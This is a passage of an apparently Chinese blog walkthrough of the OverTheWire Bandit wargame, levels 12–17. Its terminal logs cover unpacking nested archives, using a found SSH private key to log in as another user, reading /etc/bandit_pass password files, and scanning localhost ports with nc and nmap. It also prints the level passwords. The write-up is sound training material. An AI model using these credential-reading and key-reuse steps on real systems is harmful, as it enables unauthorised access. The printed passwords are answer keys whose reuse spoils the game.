0f9f 528e 4272 22bb 103c 2848 d8aa 2409  ..R.Br<span class="string">"..&lt;(H..$.</span></span><br><span class="line"><span class="string">00000130: 24d0 d4c8 4b42 7388 ce25 6c1a 7ec1 5f17  $...KBs..%l.~._.</span></span><br><span class="line"><span class="string">00000140: cc18 ddbf edc1 e3a4 67f1 7a4d 8277 c823  ........g.zM.w.#</span></span><br><span class="line"><span class="string">00000150: 0450 2232 40e0 07f1 ca16 c6d6 ef0d ecc9  .P"</span>2@...........</span><br><span class="line">00000160: 8bc0 5e2d 4b12 8586 088e 8ca0 e67d a55c  ..^-K........&#125;.\</span><br><span class="line">00000170: 2ca0 18c7 bfb7 7d45 9346 ea5f 2172 01e4  ,.....&#125;E.F._!r..</span><br><span class="line">00000180: 5598 673f 45af 69b7 a739 7814 8706 04ed  U.g?E.i..9x.....</span><br><span class="line">00000190: 5442 1240 0796 6cc8 b2f6 1ef9 8d13 421d  TB.@..l.......B.</span><br><span class="line">000001a0: 461f 2e68 4d91 5343 34b5 56e7 46d0 0a0a  F..hM.SC4.V.F...</span><br><span class="line">000001b0: 72b7 d873 71d9 6f09 c326 402d dbc0 7cef  r..sq.o..&amp;@-..|.</span><br><span class="line">000001c0: 53b1 df60 9ec7 f318 00df 3907 2e85 d85b  S..`......9....[</span><br><span class="line">000001d0: 6a1a e105 0207 c580 e31d 82d5 8646 183c  j............F.&lt;</span><br><span class="line">000001e0: 6a04 4911 101a 5427 087c 1f94 47a2 270d  j.I...T<span class="string">'.|..G.'</span>.</span><br><span class="line">000001f0: ad12 fc5c 9ad2 5714 514f 34ba 701d fb69  ...\..W.QO4.p..i</span><br><span class="line">00000200: 8eed 0183 e2a1 53ea 2300 26bb bd2f 13df  ......S.<span class="comment">#.&amp;../..</span></span><br><span class="line">00000210: b703 08a3 2309 e43c 44bf 75d4 905e 5f96  ....<span class="comment">#..&lt;D.u..^_.</span></span><br><span class="line">00000220: 481b 362e e82d 9093 7741 740c e65b c7f1  H.6..-..wAt..[..</span><br><span class="line">00000230: 5550 f247 9043 5097 d626 3a16 da32 c213  UP.G.CP..&amp;:..2..</span><br><span class="line">00000240: 2acd 298a 5c8a f0c1 b99f e2ee 48a7 0a12  *.).\.......H...</span><br><span class="line">00000250: 03b5 5cb3 0037 cece 773c 0200 00         ..\..7..w&lt;...</span><br><span class="line"></span><br><span class="line">bandit12@bandit:/tmp/magicking$ xxd -r data.txt</span><br><span class="line"></span><br><span class="line">bandit12@bandit:/tmp/magicking$ xxd -r data.txt &gt; data</span><br><span class="line">bandit12@bandit:/tmp/magicking$ file data</span><br><span class="line">data: gzip compressed data, was <span class="string">"data2.bin"</span>, last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix</span><br><span class="line">bandit12@bandit:/tmp/magicking$ mv data data.gz</span><br><span class="line">bandit12@bandit:/tmp/magicking$ gz -d data.gz </span><br><span class="line">-bash: gz: <span class="built_in">command</span> not found</span><br><span class="line">bandit12@bandit:/tmp/magicking$ gnuzip -d data.gz </span><br><span class="line">-bash: gnuzip: <span class="built_in">command</span> not found</span><br><span class="line">bandit12@bandit:/tmp/magicking$ gzip -d data.gz </span><br><span class="line">bandit12@bandit:/tmp/magicking$ ls</span><br><span class="line">data  data.txt</span><br><span class="line"></span><br><span class="line">bandit12@bandit:/tmp/magicking$ file data</span><br><span class="line">data: bzip2 compressed data, block size = 900k</span><br><span class="line">bandit12@bandit:/tmp/magicking$ mv data data.bz2</span><br><span class="line">bandit12@bandit:/tmp/magicking$ bz2 -d data.bz2 </span><br><span class="line">-bash: bz2: <span class="built_in">command</span> not found</span><br><span class="line">bandit12@bandit:/tmp/magicking$ bzip2 -d data.bz2 </span><br><span class="line">bandit12@bandit:/tmp/magicking$ ls</span><br><span class="line">data  data.txt</span><br><span class="line">bandit12@bandit:/tmp/magicking$ file data</span><br><span class="line">data: gzip compressed data, was <span class="string">"data4.bin"</span>, last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix</span><br><span class="line">bandit12@bandit:/tmp/magicking$ gzip -d data</span><br><span class="line">gzip: data: unknown suffix -- ignored</span><br><span class="line">bandit12@bandit:/tmp/magicking$ mv data data.gz</span><br><span class="line">bandit12@bandit:/tmp/magicking$ gzip -d data.gz </span><br><span class="line">bandit12@bandit:/tmp/magicking$ file data</span><br><span class="line">data: POSIX tar archive (GNU)</span><br><span class="line">bandit12@bandit:/tmp/magicking$ mv data data.tar</span><br><span class="line">bandit12@bandit:/tmp/magicking$ tar -x data.tar</span><br><span class="line">tar: Refusing to <span class="built_in">read</span> archive contents from terminal (missing -f option?)</span><br><span class="line">tar: Error is not recoverable: exiting now</span><br><span class="line">bandit12@bandit:/tmp/magicking$ tar -xvf data.tar</span><br><span class="line">data5.bin</span><br><span class="line">bandit12@bandit:/tmp/magicking$ ls</span><br><span class="line">data5.bin  data.tar  data.txt</span><br><span class="line">bandit12@bandit:/tmp/magicking$ file data5.bin</span><br><span class="line">data5.bin: POSIX tar archive (GNU)</span><br><span class="line">bandit12@bandit:/tmp/magicking$ mv data5.bin data5.bin.tar</span><br><span class="line">bandit12@bandit:/tmp/magicking$ tar -xvf data5.bin.tar </span><br><span class="line">data6.bin</span><br><span class="line">bandit12@bandit:/tmp/magicking$ file data6.bin</span><br><span class="line">data6.bin: bzip2 compressed data, block size = 900k</span><br><span class="line">bandit12@bandit:/tmp/magicking$ mv data6.bin data6.bin.bz2</span><br><span class="line">bandit12@bandit:/tmp/magicking$ bzip2 -d data6.bin.bz2 </span><br><span class="line">bandit12@bandit:/tmp/magicking$ ls</span><br><span class="line">data5.bin.tar  data6.bin  data.tar  data.txt</span><br><span class="line">bandit12@bandit:/tmp/magicking$ ls -l</span><br><span class="line">total 48</span><br><span class="line">-rw-r--r-- 1 bandit12 root 10240 Oct 16  2018 data5.bin.tar</span><br><span class="line">-rw-r--r-- 1 bandit12 root 10240 Oct 16  2018 data6.bin</span><br><span class="line">-rw-r--r-- 1 bandit12 root 20480 Feb 14 10:42 data.tar</span><br><span class="line">-rw-r----- 1 bandit12 root  2581 Feb 14 10:37 data.txt</span><br><span class="line">bandit12@bandit:/tmp/magicking$ file data6.bin</span><br><span class="line">data6.bin: POSIX tar archive (GNU)</span><br><span class="line">bandit12@bandit:/tmp/magicking$ mv data6.bin data6.bin.tar</span><br><span class="line">bandit12@bandit:/tmp/magicking$ tar -xvf data6.bin.tar </span><br><span class="line">data8.bin</span><br><span class="line">bandit12@bandit:/tmp/magicking$ file data8.bin </span><br><span class="line">data8.bin: gzip compressed data, was <span class="string">"data9.bin"</span>, last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix</span><br><span class="line">bandit12@bandit:/tmp/magicking$ mv data8.bin data8.bin.gz</span><br><span class="line">bandit12@bandit:/tmp/magicking$ gzip -d data8.bin.gz </span><br><span class="line">bandit12@bandit:/tmp/magicking$ ls</span><br><span class="line">data5.bin.tar  data6.bin.tar  data8.bin  data.tar  data.txt</span><br><span class="line">bandit12@bandit:/tmp/magicking$ file data8.bin </span><br><span class="line">data8.bin: ASCII text</span><br><span class="line">bandit12@bandit:/tmp/magicking$ cat data8.bin </span><br><span class="line">The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL</span><br><span class="line">bandit12@bandit:/tmp/magicking$</span><br></pre></td></tr></table></figure><p>逐渐熟练的解压缩操作，简直了这压缩层数，丧心病狂</p><h3 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h3><p>根据题目所描述，<code>/etc/bandit_pass/bandit14 and can only be read by user bandit14</code></p><p>我们肯定无法访问</p><p>但是，ls之后，发现有一个私钥，而且题目表示可以不用密码</p><p>那么这文件就是ssh bandit14的私钥</p><p>直接连接，ojbk</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">bandit13@bandit:~$ ls</span><br><span class="line">sshkey.private</span><br><span class="line">bandit13@bandit:~$ cat /etc/bandit_pass/bandit14</span><br><span class="line">cat: /etc/bandit_pass/bandit14: Permission denied</span><br><span class="line">bandit13@bandit:~$ ssh</span><br><span class="line">usage: ssh [-1246AaCfGgKkMNnqsTtVvXxYy] [-b bind_address] [-c cipher_spec]</span><br><span class="line">           [-D [bind_address:]port] [-E log_file] [-e escape_char]</span><br><span class="line">           [-F configfile] [-I pkcs11] [-i identity_file]</span><br><span class="line">           [-J [user@]host[:port]] [-L address] [-l login_name] [-m mac_spec]</span><br><span class="line">           [-O ctl_cmd] [-o option] [-p port] [-Q query_option] [-R address]</span><br><span class="line">           [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]]</span><br><span class="line">           [user@]hostname [<span class="built_in">command</span>]</span><br><span class="line">bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost</span><br><span class="line">Could not create directory <span class="string">'/home/bandit13/.ssh'</span>.</span><br><span class="line">The authenticity of host <span class="string">'localhost (127.0.0.1)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Failed to add the host to the list of known hosts (/home/bandit13/.ssh/known_hosts).</span></span><br><span class="line"><span class="string">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bandit14@bandit:~$ cat /etc/bandit_pass/bandit14</span></span><br><span class="line"><span class="string">4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</span></span><br></pre></td></tr></table></figure><h3 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bandit14@bandit:~$ cat /etc/bandit_pass/bandit14</span><br><span class="line">4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</span><br><span class="line">bandit14@bandit:~$ </span><br><span class="line">bandit14@bandit:~$ telnet localhost 30000</span><br><span class="line">Trying 127.0.0.1...</span><br><span class="line">Connected to localhost.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line"></span><br><span class="line">Wrong! Please enter the correct current password</span><br><span class="line">Connection closed by foreign host.</span><br><span class="line">bandit14@bandit:~$ telnet localhost 30000</span><br><span class="line">Trying 127.0.0.1...</span><br><span class="line">Connected to localhost.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</span><br><span class="line">Correct!</span><br><span class="line">BfMYroe26WYalil77FoDi9qh59eK5xNr</span><br><span class="line"></span><br><span class="line">Connection closed by foreign host.</span><br><span class="line">bandit14@bandit:~$</span><br></pre></td></tr></table></figure><h3 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h3><p>发送需要ssl加密</p><p>搜索得知SSL可用于加密任何基于TCP/IP的应用</p><p>再搜索openssl的用法即可解出</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">bandit15@bandit:~$ openssl s_client -connect localhost:30001 -ign_eof</span><br><span class="line">CONNECTED(00000003)</span><br><span class="line">depth=0 CN = localhost</span><br><span class="line">verify error:num=18:self signed certificate</span><br><span class="line">verify <span class="built_in">return</span>:1</span><br><span class="line">depth=0 CN = localhost</span><br><span class="line">verify <span class="built_in">return</span>:1</span><br><span class="line">---</span><br><span class="line">Certificate chain</span><br><span class="line"> 0 s:/CN=localhost</span><br><span class="line">   i:/CN=localhost</span><br><span class="line">---</span><br><span class="line">Server certificate</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIICBjCCAW+gAwIBAgIEYo1NxTANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls</span><br><span class="line">b2NhbGhvc3QwHhcNMjAwMTA1MTQzNTU4WhcNMjEwMTA0MTQzNTU4WjAUMRIwEAYD</span><br><span class="line">VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAKF4u2eu</span><br><span class="line">a8VipZPviX0hfNiCnaD2ojAffdBhKTy1bmZSNRuHPBDnU7z8rblNSknSjCITda1C</span><br><span class="line">GEAI8ZktRbtLpBTbYeTgqPN/EiN5UIRMKbU6P2O93zNFPBsmyfQLrgt+DSLnsxlB</span><br><span class="line">i/yYyT7WLdtNVBpgwRwkqi9K7dk9vf9waswLAgMBAAGjZTBjMBQGA1UdEQQNMAuC</span><br><span class="line">CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0</span><br><span class="line">ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3</span><br><span class="line">DQEBBQUAA4GBAJECW6IB3Ria4xG002BqD3zEbtmrDlK6nmJq+uQ4eJ6cT18o9REb</span><br><span class="line">npy/lFzlv2LfcrYAnuAp6Fh89MKaYjNzJURjRQ9RkmcYgQJa1n+OBkATb7V+84/a</span><br><span class="line">k9PDRkscxdNFMGBSvzFD33XZ5lbaGdrwCPyoxenoYghV/753wffN7J6H</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">subject=/CN=localhost</span><br><span class="line">issuer=/CN=localhost</span><br><span class="line">---</span><br><span class="line">No client certificate CA names sent</span><br><span class="line">Peer signing digest: SHA512</span><br><span class="line">Server Temp Key: X25519, 253 bits</span><br><span class="line">---</span><br><span class="line">SSL handshake has <span class="built_in">read</span> 1019 bytes and written 269 bytes</span><br><span class="line">Verification error: self signed certificate</span><br><span class="line">---</span><br><span class="line">New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="line">Server public key is 1024 bit</span><br><span class="line">Secure Renegotiation IS supported</span><br><span class="line">Compression: NONE</span><br><span class="line">Expansion: NONE</span><br><span class="line">No ALPN negotiated</span><br><span class="line">SSL-Session:</span><br><span class="line">    Protocol  : TLSv1.2</span><br><span class="line">    Cipher    : ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="line">    Session-ID: 7EEA483CA2D18FE7CB98BB6A1CC800C7BE4444E492EBFD398DDA8EABD18712C2</span><br><span class="line">    Session-ID-ctx: </span><br><span class="line">    Master-Key: D0D0B7463ABC8AD513D016BEBF3932F325BE53DBBA712624C9E820AB95735BF63FA59EAECFF34AE5523F2E05BC8BE5F2</span><br><span class="line">    PSK identity: None</span><br><span class="line">    PSK identity hint: None</span><br><span class="line">    SRP username: None</span><br><span class="line">    TLS session ticket lifetime hint: 7200 (seconds)</span><br><span class="line">    TLS session ticket:</span><br><span class="line">    0000 - 56 e9 4e 87 6a 28 48 d0-13 42 5f b9 61 b0 dd d0   V.N.j(H..B_.a...</span><br><span class="line">    0010 - d6 bb 15 df 9d 3a 2c 9f-2d 88 a4 e2 b8 ec 36 de   .....:,.-.....6.</span><br><span class="line">    0020 - 6c ba 2d ac d0 d4 0b 12-d1 76 ac <span class="built_in">cd</span> 8f 8d 4d b9   l.-......v....M.</span><br><span class="line">    0030 - e4 8d 7f 9e 0b f5 2a 67-42 6c 52 08 94 27 09 75   ......*gBlR..<span class="string">'.u</span></span><br><span class="line"><span class="string">    0040 - 67 e5 8a 66 24 50 4f db-a7 9d 01 0d 81 ba b3 12   g..f$PO.........</span></span><br><span class="line"><span class="string">    0050 - c5 2e 8d ee ef 0a 2d 6d-a0 89 72 36 18 30 b2 24   ......-m..r6.0.$</span></span><br><span class="line"><span class="string">    0060 - fa 82 0a b5 9d da d2 55-70 a7 fd 6d 3f 96 9e 85   .......Up..m?...</span></span><br><span class="line"><span class="string">    0070 - 8f e8 f8 8d 0e 29 0f 84-12 97 9c 31 7d 79 ef 75   .....).....1&#125;y.u</span></span><br><span class="line"><span class="string">    0080 - f5 f9 f6 cc 74 29 58 a0-a9 48 f5 17 c4 1d 73 ba   ....t)X..H....s.</span></span><br><span class="line"><span class="string">    0090 - f1 30 ce 52 12 b6 e2 c2-75 f9 94 b9 04 2a a9 d8   .0.R....u....*..</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Start Time: 1581676007</span></span><br><span class="line"><span class="string">    Timeout   : 7200 (sec)</span></span><br><span class="line"><span class="string">    Verify return code: 18 (self signed certificate)</span></span><br><span class="line"><span class="string">    Extended master secret: yes</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">BfMYroe26WYalil77FoDi9qh59eK5xNr</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string">cluFn7wTiGryunymYOu4RcffSxQluehd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">closed</span></span><br><span class="line"><span class="string">bandit15@bandit:~$</span></span><br></pre></td></tr></table></figure><h3 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h3><p>这道题要我们在给定范围内找出正确的端口，<code>nc</code>，<code>nmap</code>都可以用</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line">bandit16@bandit:~$ nc -zv localhost 31000-32000</span><br><span class="line">localhost [127.0.0.1] 31790 (?) open</span><br><span class="line">localhost [127.0.0.1] 31518 (?) open</span><br><span class="line"></span><br><span class="line">bandit16@bandit:~$ nmap localhost -p31000-32000 -v</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2020-02-14 11:38 CET</span><br><span class="line">Initiating Ping Scan at 11:38</span><br><span class="line">Scanning localhost (127.0.0.1) [2 ports]</span><br><span class="line">Completed Ping Scan at 11:38, 0.00s elapsed (1 total hosts)</span><br><span class="line">Initiating Connect Scan at 11:38</span><br><span class="line">Scanning localhost (127.0.0.1) [1001 ports]</span><br><span class="line">Discovered open port 31518/tcp on 127.0.0.1</span><br><span class="line">Discovered open port 31790/tcp on 127.0.0.1</span><br><span class="line">Completed Connect Scan at 11:38, 0.04s elapsed (1001 total ports)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (127.0.0.1)</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">31518/tcp open  unknown</span><br><span class="line">31790/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.09 seconds</span><br><span class="line">bandit16@bandit:~$</span><br><span class="line">bandit16@bandit:~$</span><br><span class="line">bandit16@bandit:~$ nmap localhost -p31000-32000 </span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2020-02-14 11:38 CET</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost (127.0.0.1)</span><br><span class="line">Host is up (0.00024s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">31518/tcp open  unknown</span><br><span class="line">31790/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 0.10 seconds</span><br><span class="line"></span><br><span class="line">bandit16@bandit:~$ </span><br><span class="line">bandit16@bandit:~$</span><br><span class="line">bandit16@bandit:~$ openssl s_client -connect localhost:31790 -ign_eof</span><br><span class="line">CONNECTED(00000003)</span><br><span class="line">depth=0 CN = localhost</span><br><span class="line">verify error:num=18:self signed certificate</span><br><span class="line">verify <span class="built_in">return</span>:1</span><br><span class="line">depth=0 CN = localhost</span><br><span class="line">verify <span class="built_in">return</span>:1</span><br><span class="line">---</span><br><span class="line">Certificate chain</span><br><span class="line"> 0 s:/CN=localhost</span><br><span class="line">   i:/CN=localhost</span><br><span class="line">---</span><br><span class="line">Server certificate</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIICBjCCAW+gAwIBAgIEGPttrzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDDAls</span><br><span class="line">b2NhbGhvc3QwHhcNMjAwMjA5MjA0NzE5WhcNMjEwMjA4MjA0NzE5WjAUMRIwEAYD</span><br><span class="line">VQQDDAlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAPiElqK1</span><br><span class="line">D097ZCNDgKFxqX1ZUUpFfuoiDSP2dw5KrIruaTQMmfqCxo6dSHvkj1sF//YRI28k</span><br><span class="line">BGyu9pE3zLO45uk4PrjoORYLoQjTCb61oVZLECCOIG21WQUbrhjW4zlZGmtWrqw6</span><br><span class="line">zGLk7dZ8MeYHVSvK0n3Ar45hVedpsLC618ZTAgMBAAGjZTBjMBQGA1UdEQQNMAuC</span><br><span class="line">CWxvY2FsaG9zdDBLBglghkgBhvhCAQ0EPhY8QXV0b21hdGljYWxseSBnZW5lcmF0</span><br><span class="line">ZWQgYnkgTmNhdC4gU2VlIGh0dHBzOi8vbm1hcC5vcmcvbmNhdC8uMA0GCSqGSIb3</span><br><span class="line">DQEBBQUAA4GBADJEAM0VceCYaqhfzpzkzf6dhCIWbb/8P+51Wxw24sn9iLHxdqYe</span><br><span class="line">1WNfxtQb8IYb3q/6JJDJ3d6plNKmFMkFBe5AiN05PCDeMymkTv8vlKj18UNR/4GL</span><br><span class="line">AH1aFGcEYVXkwX0Kl844muUrK7S0AbOvcHmzzA++qTmfB1UK264G0iAH</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">subject=/CN=localhost</span><br><span class="line">issuer=/CN=localhost</span><br><span class="line">---</span><br><span class="line">No client certificate CA names sent</span><br><span class="line">Peer signing digest: SHA512</span><br><span class="line">Server Temp Key: X25519, 253 bits</span><br><span class="line">---</span><br><span class="line">SSL handshake has <span class="built_in">read</span> 1019 bytes and written 269 bytes</span><br><span class="line">Verification error: self signed certificate</span><br><span class="line">---</span><br><span class="line">New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384</span><br><span class="line">Server public key is 1024 bit</span><br><span class="line">Secure Renegotiation IS supported</span><br><span class="line">Compression: NONE</span><br><span class="line">Expansion: NONE</span><br><span class="line">No ALPN negotiated</span><br><span class="line">SSL-Session:</span><br><span class="line">    Protocol  : TLSv1.2</span><br><span class="line">    Cipher    : 